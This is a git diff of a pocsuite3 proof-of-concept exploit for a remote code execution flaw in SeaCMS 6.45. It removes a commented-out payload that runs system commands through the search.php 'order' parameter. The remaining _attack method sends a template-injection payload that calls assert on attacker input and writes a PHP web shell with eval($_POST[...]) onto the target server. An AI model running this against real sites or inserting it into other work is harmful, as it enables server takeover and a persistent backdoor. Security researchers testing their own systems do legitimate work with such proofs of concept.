@@ -3,7 +3,7 @@
 # Datetime  : 2021/3/13 10:15
 # Product   : PyCharm
 # Project   : pocsuite3
-# File      : Apache_Kylin_CVE_2020_13925.py
+# File      : seacms_6_45_rce.py
 # explain   : 文件说明
 """
 If you have issues about development, please read:
@@ -69,27 +69,6 @@ class DemoPOC(POCBase):
         return self.parse_output(result)
 
     def _attack(self):
-        # result = {}
-        # command = self.get_option("command")
-        # random_string = random_str(16)
-        # verify_payload = "searchword=1&searchtype=5&order=}{end if}{if:1)echo " + random_string + ".system(" + command + ")." + random_string + ";if(1}{end if}"
-        # veri_url = urljoin(self.url, '/search.php')
-        # headers = {
-        #     "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
-        #     "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
-        # }
-        # try:
-        #     resp = requests.post(veri_url,data=verify_payload,headers=headers)
-        #     if random_string in resp.text:
-        #         pattern = "%s.*%s" % (random_string,random_string)
-        #         command_result  = re.search(pattern,resp.text).group()
-        #         result['VerifyInfo'] = {}
-        #         result['VerifyInfo']['URL'] = veri_url
-        #         result['VerifyInfo']['Payload'] = verify_payload
-        #         result['VerifyInfo']['Command_result'] = command_result.split(random_string)[1]
-        # except Exception as e:
-        #     logger.warn(str(e))
-        # return self.parse_output(result)
         result = {}
         random_string = random_str(16)
         verify_payload = "searchword=1&searchtype=5&order=}{end if}{if:1)$_POST[func]($_POST[cmd]);if(1}{end if}&cmd=fwrite(fopen('" + random_string + ".php','w'),'<?php @eval($_POST[sma11stu]);?>" + random_string + "')&func=assert"
